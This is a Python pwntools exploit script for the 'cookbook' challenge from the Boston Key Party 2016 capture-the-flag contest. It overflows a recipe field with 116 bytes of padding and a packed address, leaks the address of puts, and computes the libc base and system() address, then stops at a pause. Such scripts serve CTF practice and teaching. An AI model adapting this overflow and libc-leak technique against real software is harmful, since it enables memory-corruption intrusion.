# -*- coding: utf-8 -*-
#
# Boston Key Party 2016 pwnable cookbook
#
# Based on http://yum3.tistory.com/48
#

from pwn import *
import re

r = process('./cookbook')
b = ELF('./cookbook')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')

def s(msg):
    r.send(msg + '\n')

if __name__ == "__main__":
    print r.recvuntil("what's your name?")
    s('babo')

    print r.recvuntil('[q]uit\n')
    s('c')
    print r.recvuntil('[q]uit\n')
    s('n')
    print r.recvuntil('[q]uit\n')
    s('d')
    print r.recvuntil('[q]uit\n')
    s('q')

    print r.recvuntil('[q]uit\n')
    s('a')
    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s('n')
    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s('g')
    s('A' * 116 + p32(0x804d030))
    print r.recvuntil("[e]xport saving changes (doesn't quit)?\n")
    s('q')
    
    print r.recvuntil('[q]uit\n')
    s('c')
    print r.recvuntil('[q]uit\n')
    s('p')
    resp = r.recvuntil('[q]uit\n')

    print resp
    
    PUTS_ADDR = u32(re.findall(r"recipe type: (.+)", resp)[0][:4])
    LIBC_BASE = PUTS_ADDR - libc.symbols['puts']
    SYSTEM_ADDR = LIBC_BASE + libc.symbols['system']

    log.info('LIBC_BASE: 0x%x' % LIBC_BASE)
    log.info('SYSTEM_ADDR: 0x%x' % SYSTEM_ADDR)

    pause()

